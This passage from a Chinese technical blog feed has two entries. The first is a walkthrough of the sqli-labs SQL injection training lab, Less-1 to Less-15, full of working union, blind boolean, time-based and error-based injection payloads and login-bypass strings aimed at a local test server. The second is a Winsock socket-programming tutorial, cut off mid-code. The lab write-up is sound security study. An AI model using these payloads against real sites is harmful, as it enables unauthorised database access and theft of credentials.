class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:referers</span></span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">2</span><span class="regexp">/index.php?id=1--+</span></span><br></pre></td></tr></table></figure><p>正常，说明是正常的数字型注入，同Less-1，注入表名。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/<span class="keyword">index</span>.php?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">3</span><span class="regexp">/index.php?id=1')--+</span></span><br></pre></td></tr></table></figure><p>是基于’)的注入，注入出表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>以上两条语句均不报错，那么我们试试”</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure><p>报错信息是</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p></blockquote><p>所以我们可以猜测，是基于”)的注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-4/index.php?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>即可注入出表名。<br>但是我觉得我想不明白<br>注入语句是：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=($id) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>当id=1’–+时，sql语句为</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;          #id=<span class="string">"1'--+"</span></span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=(<span class="string">"1'--+"</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>即为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE id=(<span class="string">"1'</span></span><br></pre></td></tr></table></figure><p>这为什么不报错</p><p>最后实验发现，由于$id = ‘“‘ . $id . ‘“‘;  注释符在双引号内，导致注释符被看作字符串的一部分而非特殊符号。。。</p><p>前面的字符型注入没有出现这个问题是因为字符型注入的sql语句是这么写的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>本题多了一个<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">id = <span class="string">'"'</span> . <span class="variable">$id</span> . <span class="string">'"'</span>;</span></span><br></pre></td></tr></table></figure></p><p>相当于把id里的内容str化，所以特殊符号都失效了。输入双引号报错原因是id=”1””字符串双引号不匹配，所以会报错</p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>一进去，就是一个大大的</p><blockquote><p>You are in………..</p></blockquote><p>让我不禁想起了布尔盲注，不如试试看喽。</p><p>先加一个’</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>熟悉的You are in………..又回来了，也就是说这是一个字符型注入，先判断一下数据库的长度</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>发现正确的You are in………..，也就是说数据库长度是8，那咱们看看数据库名字的首字母是什么<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p><p>有回显，也就是说首字母的ascii是115，也就是s（以此类推<br>）//我就不爆表名了啊，咕咕咕</p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"--+</span></span><br></pre></td></tr></table></figure><p>加双引号报错，再加注释符恢复正常，于是与Less-5其实一样的<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and length(database())=8--+</span></span><br></pre></td></tr></table></figure></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and ascii(substr(database(),1,1))=115--+</span></span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">7</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><p>报错信息被关掉了，注释符也被过滤，但是加单引号报错，我们也就是说不出意外是字符型注入<br>尝试<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1/sqli</span>-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span><span class="string">' and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>最后剩下的单引号去补全语句<br>所以我们可以尝试一下布尔盲注</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span> <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现正确，也就是说数据库名字长度是8，接下来同Less-5</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">8</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>正常显示you are in，报错无回显</p><p>当=8不报错，=9报错，感觉和之前的盲注没有任何区别<br>于是 同上</p><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>延时注入，这次无论出不出错回显都是一样的，不能用布尔盲注的方法，尝试使用延时注入</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现成功延时，我们就可以用延时注入了，试试看数据库的长度</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>即如果数据库长度是8，则延时5s，否则什么都不干。延时注入耗时长，并且稳定性不高，因为无法判断是网络卡还是真的延时，如果把延时时间设的较高，可以排除网络卡顿的因素，但是耗时长，导致效率较低。</p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>同第十个，延时注入，把单引号换成双引号即可。<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> sleep(<span class="number">5</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>一进去是一个登录框(我猜是post注入)</p><p>那就试试吧。<br>输入一下</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">password:<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>然后回显</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure><p>这个是默认的用户名和密码，在实际的渗透测试中就等于是管理员用户的账号密码。那么这里存在post注入，post注入需要借助抓包工具。让我们打开可爱的bp。<br>发现post上去的数据包长这个样子</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure><p>发送到repeater中尝试post注入，试试<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin <span class="keyword">and</span> <span class="attribute">1</span>=2 union select &amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure></p><p>发现回显，也就是说存在union联合查询注入，但是还存在报错注入。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin 'and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> database()))) --+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></p><p>extractvalue函数需要一个xpath路径，而concat组合出来的database并不是xpath形式，所以会报错，但是这种报错注入的方式仅仅能用在显错注入上<br>报错注入的结果是</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure><p>当然最简单的方式是直接sqlmap跑……</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>输入admin’ or 1=1#发现没有回显，那我们试试双引号，发现直接报错，是需要双引号+括号的形式:”)</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin<span class="string">") or 1=1#</span></span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure><p>发现直接登陆上了管理员的账户，存在post注入，我们试一试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin") and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>())))#</span><br><span class="line"><span class="keyword">password</span>:<span class="keyword">admin</span></span><br></pre></td></tr></table></figure></p><p>结果是</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure><p>一切OK</p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>基于’)的注入，报错注入一行完事</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin') <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database())))#&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>当然此题也能时间盲注，但是有其他注入方法的情况下极度不推荐时间盲注，因为实在是，太慢了</p><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>注释符不可用，所以随意闭合一下就好，基于”的盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin" <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database()))) <span class="keyword">and</span> <span class="string">"1"</span>=<span class="string">"1  &amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>得出结果。</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>实在不想一点点去FUZZ了，我就使用了偷看sql语句大法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>嗯 盲注，单引号<br>上一波时盲payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin' <span class="keyword">and</span> sleep(5)--+&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>嗯，延时了，能时盲，<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)='s',sleep(<span class="number">5</span>),<span class="number">1</span>)--+&amp;passwd=<span class="number">456</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure></p><p>嗯，延时了，能推断出第一个字母是s，解决问题。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>套接字编程学习</title>
      <link href="/2019/11/01/%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/11/01/%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="套接字编程学习"><a href="#套接字编程学习" class="headerlink" title="套接字编程学习"></a>套接字编程学习</h2><p>使用的是Windows的线程库，但是实现地较为简单和整体的架构也比较混乱，写一篇blog稍微总结一下。</p><hr><a id="more"></a> <h3 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h3><blockquote><p>套接字（socket）是一个抽象层，应用程序可以通过它发送或接收数据，可对其进行像对文件一样的打开、读写和关闭等操作。套接字允许应用程序将I/O插入到网络中，并与网络中的其他应用程序进行通信。网络套接字是IP地址与端口的组合。 </p></blockquote><blockquote><p>通信时，其中的一个网络应用程序将要传输的一段信息写入它所在主机的Socket中，该Socket通过网络接口卡的传输介质将这段信息发送给另一台主机的Socket中，使这段信息能传送到其他程序中。 </p></blockquote><p>用人话讲其实就是所谓套接字就是传输层的端点，两个传输层的连接过程是，先把要传输的数据传给套接字，让套接字去传输信息，另一个传输层的套接字接受这个信息。</p><h4 id="套接字的分类"><a href="#套接字的分类" class="headerlink" title="套接字的分类"></a>套接字的分类</h4><blockquote><p>流式套接字： 它提供了一种可靠的、面向连接的双向数据传输服务，实现了数据无差错、无重复的发送。 也就是说流式套接字建立了一种安全可靠的连接。（TCP）</p></blockquote><blockquote><p>数据报套接字： 它提供了一种无连接、不可靠的双向数据传输服务。数据包以独立的形式被发送，并且保留了记录边界，不提供可靠性保证。 （UDP）</p></blockquote><blockquote><p>原始套接字: 该套接字允许对较低层协议（如IP或ICMP）进行直接访问，常用于网络协议分析，检验新的网络协议实现，也可用于测试新配置或安装的网络设备。 </p></blockquote><hr><h3 id="套接字编程流程"><a href="#套接字编程流程" class="headerlink" title="套接字编程流程"></a>套接字编程流程</h3><p>先上一个套接字编程的流程图</p><p><img src="https://s2.ax1x.com/2019/11/01/KH67WR.jpg" alt="套接字编程流程图"></p><p>然后介绍一下具体的流程</p><p>Server:</p><blockquote><p>引用头文件和加载动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winsock2.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br></pre></td></tr></table></figure><blockquote><p>指定套接字版本并初始化动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WSADATA WSAData;</span><br><span class="line">WORD SocketVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSAStartup(SocketVersion,&amp;WSAData);</span><br></pre></td></tr></table></figure><blockquote><p>建立一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br></pre></td></tr></table></figure><blockquote><p>配置套接字所需要的参数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 12345</span></span><br><span class="line">server.sin_family = AF_INET;<span class="comment">/*使用IPV4*/</span></span><br><span class="line">server.sin_port = htons(PORT);<span class="comment">/*使用12345端口并把主机字节序转化为网络字节序*/</span></span><br><span class="line">server.sin_addr.s_addr = htonl(INADDR_ANY);<span class="comment">/*接受到本机所有网卡的数据*/</span></span><br></pre></td></tr></table></figure><blockquote><p>绑定一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RetVal = bind(sListen,(struct sockaddr *)&amp;server,size);</span><br></pre></td></tr></table></figure><blockquote><p>设置监听</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen(sListen, maxnumber);</span><br></pre></td></tr></table></figure><blockquote><p>关闭连接与清除初始化动态链接库时分配的资源</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">closesocket(sListen);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><p>Client:</p><blockquote><p>client与Server不同的地方有connect，连接服务器</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKET sClient;</span><br><span class="line">SOCKADDR_IN server;</span><br><span class="line">connect(sClient, (struct sockaddr*) &amp; server, <span class="keyword">sizeof</span>(SOCKADDR_IN))</span><br></pre></td></tr></table></figure><hr><p>我写了一个可以客户端可以随意给服务端发消息，客户端可以通过指令和指定的另外的客户端发消息，但是因为线程不能创建线程，所以只能发一条回一条。</p><blockquote><p>首先创建一个线程用来接受所有客户端的消息。接受消息的同时会记录下该客户端的惟一标识号，便于之后查询当前在线用户和用户通信的实现。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">thread <span class="title">task01</span><span class="params">(receiveprocess, sClient)</span></span>;  <span class="comment">/*接收消息子线程*/</span></span><br><span class="line">task01.detach();</span><br></pre></td></tr></table></figure><p>顺便写一下detach和join的区别</p><blockquote><p>detach：主线程与子线程分离，子线程结束后，资源自动回收。</p><p>join：子线程合入主线程，主线程阻塞等待子线程结束，然后回收子线程资源。 </p></blockquote><p>说人话就是detach和主线程没关系，资源回收会由系统自动回收。join是主线程阻塞，等着回收该线程资源。</p><blockquote><p>在receiveprocess函数中我接受一个客户端的消息，但因为我接收消息使用的是一个公共的全局缓冲区，所以约等于接受所有客户端的消息。第二个语句将字符串末尾加上字符串结束符，保证字符串正确显示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetVal = recv(sClient, ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><blockquote><p>接着用户可以输入指令，在receiveprocess中将用户输入与固定字符串进行比对。比如用户输入communicate会与某个用户进行通信。（由服务器转发实现）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(ReceiveBuff, communicate))<span class="comment">/*通过communicate指令与当前当前在线用户通信*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> want = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> a = findusernumber(sClient);<span class="comment">/*该用户唯一标识码*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a = "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">s = <span class="string">"请输入您的想要与谁通信"</span>;</span><br><span class="line">sendtouser(s, sClient);</span><br><span class="line">want = reciveonenumber(sClient, a);<span class="comment">/*该用户想要与谁通信*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"用户"</span>&lt;&lt;a&lt;&lt; <span class="string">"想与"</span> &lt;&lt; want &lt;&lt; <span class="string">"通信"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">communicateuseranduser(information[a].user, information[want].user, a, want);</span><br><span 